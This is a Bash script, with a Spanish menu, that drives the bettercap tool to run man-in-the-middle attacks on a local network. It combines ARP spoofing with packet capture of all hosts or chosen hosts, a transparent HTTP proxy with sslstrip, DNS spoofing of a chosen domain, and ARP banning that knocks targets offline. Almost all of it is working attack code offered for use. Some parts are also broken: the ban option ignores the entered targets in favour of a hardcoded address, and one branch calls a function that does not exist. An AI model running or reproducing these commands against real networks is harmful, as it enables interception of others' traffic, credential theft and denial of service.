#!/bin/bash
clear;

BANNER() {
			echo;
			echo -e "\e[0;32m [[[[[[[[[[[[[[[[[[[[[[[[[[[[[*]]]]]]]]]]]]]]]]]]]]]]]]]]\e[0m"
			echo -e "\e[0;32m [[[[[[[[[[[[[[\e[0;31mFAST_BETTERCAP \e[0;32m|\e[0;31m Version 0.1\e[0;32m]]]]]]]]]]]]]]\e[0m"
			echo -e "\e[0;32m [[[[[[[[[[[[[[[[[[[[[[[[[[[[[*]]]]]]]]]]]]]]]]]]]]]]]]]]\e[0m"
			echo -e "\e[0;32m [[[[[[[[[[[[[[[[[[[[[[[[[[[[[|]]]]]]]]]]]]]]]]]]]]]]]]]]\e[0m"
			echo -e "\e[0;32m [[[[[[[[[[[[[[[[[[[[[[\e[0;31mBY: JOHN-WICK\e[0;32m]]]]]]]]]]]]]]]]]]]]]\e[0m"
			echo -e "\e[0;32m [[[[[[[[[[[[[[[[[[[[[[[[[[[[[*]]]]]]]]]]]]]]]]]]]]]]]]]]\e[0m"

		 }

			ERROR() {
						echo;
						echo -e "\e[0;31m[[[[[[[[ERROR, LA OPCION INGRESADA NO CORESPONDE  A NINGUNA]]]]]]]\e[0m"; sleep 02 ; clear ; MENU_PRINCIPAL
					}

		   ERROR1() {
						echo;
						echo -e "\e[0;31m[[[[[[[[ERROR, LA OPCION INGRESADA NO CORESPONDE  A NINGUNA]]]]]]]\e[0m"; sleep 02 ; clear ; SNIFF
					}


SALIR() {
			reset; exit 0
	}

BAN_TARGETS () {
				while true; do
						echo; echo -e "\e[0;31m Menu principal, opcion \e[0;37m5 \e[0;32m|\e[0;37m Ban target/s.\e[0m"
						echo; echo -n -e "\e[0;32m [[[*]]] \e[0;31mQue target/s desea banear: "; tput sgr0
						echo -e "\e[0;32m [[[*]]] \e[0;37m Paramas de un solo target, separarlos por "," | ejemplo: 192.1.2.3,192.4.5.6\e[0m"
						read TARGET
							if [ -z "$TARGET" ]; then
									echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; BAN_TARGETS;
								else
									bettercap -eval "set arp.spoof.targets 192.168.1.101; arp.spoof on; arp.ban on; net.probe on" 1> /dev/null &
									
							fi
				done	
	}
	
	#dnspoof #AUN NO TERMINO ESTA PARTE DEL SCRIPT , TENGO QUE MEJORAR ESTA OPCION DE DNS SPOOF.. 
							DNSSPOOF() { if [ -d ~/bettercap ]; then
													while true; do
															echo; echo -e "\e[0;31m Menu principal, opcion \e[0;37m3 \e[0;32m|\e[0;37m Dns spoof.\e[0m"
															echo; echo -n -e "\e[0;32m [[[*]]] \e[0;31mQue dominio desea suplantar: "; tput sgr0
															read DOMINIO
															if [ -z "$DOMINIO" ]; then
																		echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; DNSSPOOF;

																else
																	while true; do
																		echo -n -e "\e[0;32m [[[*]]] \e[0;31mDesea guarda los paquetes capturados en un archivo (si/no): "; tput sgr0
																		read SINO
																			if [ -z "$SINO" ]; then
																						echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; DNSSPOOF;
																				else
																						case $SINO in
																							[si]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set dns.spoof.domains $DOMINIO; set dns.spoof.address; set dns.spoof.all true; set net.sniff.output /root/bettercap/$DOMINIO.pcap; set net.sniff.verbose false; dns.spoof on; net.sniff on; arp.spoof on" && MENU_PRINCIPAL;
																							;;
																							[no]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set dns.spoof.domains $DOMINIO; set dns.spoof.address; set dns.spoof.all true; set net.sniff.verbose false; dns.spoof on; net.sniff on; arp.spoof on" && MENU_PRINCIPAL;
																							;;
																								* ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]"; DNSSPOOF;
																							;;
																						esac
																			fi
																	done
															fi
													done
											else
											mkdir ~/bettercap 2> /dev/null ; DNSSPOOF;
										fi
									}
							


	HTTP_PROXY() { if [ -d ~/bettercap ]; then

							while true; do
									echo; echo -e "\e[0;31m Menu principal, opcion \e[0;37m2 \e[0;32m|\e[0;37m Proxy htttp tranparente.\e[0m"
									echo; echo -n -e "\e[0;32m [[[*]]] \e[0;31mUtilizar sslstrip.? (si|no): "; tput sgr0
									read SSLSTRIP
									if [ -z $SSLSTRIP ]; then
											echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; SSLSTRIP;
										else
												case $SSLSTRIP in
														[si]* ) while true; do
																		echo -n -e "\e[0;32m [[[*]]] \e[0;31mDesea guarda los paquetes capturados en un archivo (si/no): "; tput sgr0
																		read SINO 
																		if [ -z "$SINO" ]; then
																				echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; SSLSTRIP;
																			else
																					case $SINO in
																						[si]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set http.proxy.sslstrip true ; set net.sniff.verbose false; set arp.spoof.targets; set net.sniff.output /root/bettercap/PROXY-HTTP-SSLSTRIP.pcap; arp.spoof on; net.sniff on; http.proxy on; net.probe on" && MENU_PRINCIPAL; 
																						;;
																						[no]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set http.proxy.sslstrip true ; set net.sniff.verbose false; set arp.spoof.targets; arp.spoof on; net.sniff on; http.proxy on; net.probe on" && MENU_PRINCIPAL
																						;;
																							* ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]";HTTP_PROXY 
																						;;
																					esac
																			
																		fi	
																
																done
														;;
														[no]* ) while true; do
																		echo -n -e "\e[0;32m [[[*]]] \e[0;31mDesea guarda los paquetes capturados en un archivo (si/no): "; tput sgr0
																		read SINO 
																		if [ -z "$SINO" ]; then
																				echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; SSLSTRIP;
																			else
																					case $SINO in
																						[si]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set net.sniff.verbose false; set arp.spoof.targets; set net.sniff.output /root/bettercap/PROXY-HTTP-SSLSTRIP.pcap; arp.spoof on; net.sniff on; http.proxy on; net.probe on" && MENU_PRINCIPAL; 
																						;;
																						[no]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "set net.sniff.verbose false; set arp.spoof.targets; arp.spoof on; net.sniff on; http.proxy on; net.probe on" && MENU_PRINCIPAL
																						;;
																							* ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]";HTTP_PROXY 
																						;;
																					esac
																		fi
																done
														;;
														    * ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]";HTTP_PROXY
														;;
												esac
									fi	
									 
									done
						else
							mkdir ~/bettercap ; HTTP_PROXY
					fi
						
				}


			SNIFFALL() { echo;
	if [ -d ~/bettercap ]; then
					
					while true; do
							echo -e "\e[0;32m [[[\e[1;31m1\e[0;32m]]] \e[0;37mSniffeando toda la red.\e[0m"
							echo -n -e "\e[0;32m [[[*]]] \e[1;31mDesea guarda los paquetes capturados en un archivo (si/no) :\e[0m"; tput sgr0
							read SINO
						case $SINO in
								[s]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /root/bettercap/captura_de_toda_la_red.pcap; set net.sniff.verbose false; net.sniff on " && SNIFF
									;;
								[n]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on " && SNIFF
									;;	
									* ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]";SNIFFALL;
						esac

					done
			else
			mkdir ~/bettercap 1> /dev/null; SNIFFALL;
	fi			
						}
						
CONTINUA() {
	while true; do
								echo -n -e "\e[0;32m [[[*]]] \e[1;31m Desea guarda los paquetes capturados en un archivo (si/no) : \e[0m";  tput sgr0
										read SINO
									if [ -z "$SINO" ]; then
													echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; echo; CONTINUA;
												else
											case $SINO in
												[s]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "net.probe on; set arp.spoof.targets $HOSTIP ; arp.spoof on; set net.sniff.output /root/bettercap/$HOSTIP.pcap; set net.sniff.verbose false; net.sniff on" && SNIFF
												;;
												[n]* ) sudo xfce4-terminal --geometry=193x40 -x bettercap -eval "net.probe on; set arp.spoof.targets $HOSTIP ; arp.spoof on; set net.sniff.verbose false; net.sniff on" && SNIFF
												;;
												   * ) echo -e "\e[0;31m[[[[POR FAVOR SOLO PONGA (s|n)]]]]"; echo; CONTINUA
											esac
									fi
	done
}

	SNIFFTARGET() { if [ -d ~/bettercap ]; then
							echo; echo -e "\e[0;32m [[[\e[1;31m2\e[0;32m]]] \e[0;37m Sniffeando host especifico.\e[0m"
							echo -n -e "\e[0;32m [[[*]]] \e[1;31m Cual es la host que desea sniffear: \e[0m"; tput sgr0
							read HOSTIP
								if [ -z "$HOSTIP" ]; then
										echo; echo -e "\e[0;31m [[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; sleep 2 ; SNIFFTARGET; 
									else
										CONTINUA
								fi
						else
							mkdir ~/bettercap ; SNIFFTARGET;
					fi
	}
				

			SNIFFTARGETS() { if [ -d ~/bettercap ]; then 
								echo; echo -e "\e[0;32m [[[\e[1;31m3\e[0;32m]]] \e[0;37m Sniffeando varios targets especificos.\e[0m"
								echo -n -e "\e[0;32m [[[*]]] \e[1;31m Cuales son las IP a sniffear: \e[0m"; tput sgr0
								read HOSTIP
									if [ -z "$HOSTIP" ]; then
											echo; echo -e "\e[0;31m[[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; sleep 2 ; SNIFFTARGETS;
										else
											CONTINUA
									fi
								else
									mkdir ~/bettercap ; SNIFFTARGETS
							fi
				}



HOSTUP() { clear; BANNER; echo;
					sudo xfce4-terminal --geometry=156x32 -x bettercap -eval "net.probe on; ticker on "
	MENU_PRINCIPAL;
	
	}



			SNIFF() { clear; BANNER; echo;
						echo -e "\e[1;31m  1) \e[0;37m Sniffear toda la red\e[0m"
						echo -e "\e[1;31m  2) \e[0;37m Sniffear un target especifico\e[0m"
						echo -e "\e[1;31m  3) \e[0;37m Sniffear varios targets\e[0m"
						#echo -e "\e[1;31m 4) \e[0;37m Proxy http transparente\e[0m"
						echo -e "\e[1;31m  4) \e[0;37m Menu principal\e[0m"
						echo;
						echo -e "\e[1;37m 99) \e[0;31m Salir\e[0m"
						echo;
						echo -n -e "\e[0;32m\e[4m[[[*]]] sniff\e[0;31m > " ; tput sgr0
						read OPCIONSNIFF
							while :
							do
									if [ -z "$OPCIONSNIFF" ]; then
												echo; echo -e "\e[0;31m[[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; sleep 2 ; clear; SNIFF;
										else
												case $OPCIONSNIFF in
														1) SNIFFALL
														;;
														2) SNIFFTARGET
														;;
														3) SNIFFTARGETS
						#								;;
						#								4) HTTP_PROXY
														;;
														4) MENU_PRINCIPAL
														;;
														99) SALIR
														;;
														*) ERROR1
														;;
												esac
									fi
							done
					}

MENU_PRINCIPAL() { clear;
BANNER;
echo;
echo -e "\e[1;31m  1) \e[0;37m Sniff\e[0m"
echo;
echo -e "\e[1;31m  2) \e[0;37m Proxy HTTP transparente\e[0m"
echo; 
echo -e "\e[1;31m  3) \e[0;37m Dns spoof\e[0m"
echo
echo -e "\e[1;31m  4) \e[0;37m Host en red\e[0m"
echo;
echo -e "\e[1;31m  5) \e[0;37m Banear target/s\e[0m"
echo;
echo -e "\e[1;37m 99) \e[0;31m Salir\e[0m"
echo 
echo -n -e "\e[0;32m\e[4m[[[*]]] fast bettercap\e[0;31m > " ; tput sgr0
read OPCIONMENU
while :
do
	 if [ -z "$OPCIONMENU" ]; then
			echo; echo -e "\e[0;31m[[[[OPCION VACIA, VUELVA A INTENTARLO]]]]"; sleep 2 ; clear; MENU_PRINCIPAL;
		else
			case $OPCIONMENU in
					1) SNIFF
					;;
					2) HTTP_PROXY
					;;
					3) DNSSPOOF
					;;
					4) HOSTUP
					;;
					5) BAN_TARGETS
					;;
					99) SALIR
					;;
					*) ERROR
					;;
			esac 
	fi
done	
}

MENU_PRINCIPAL
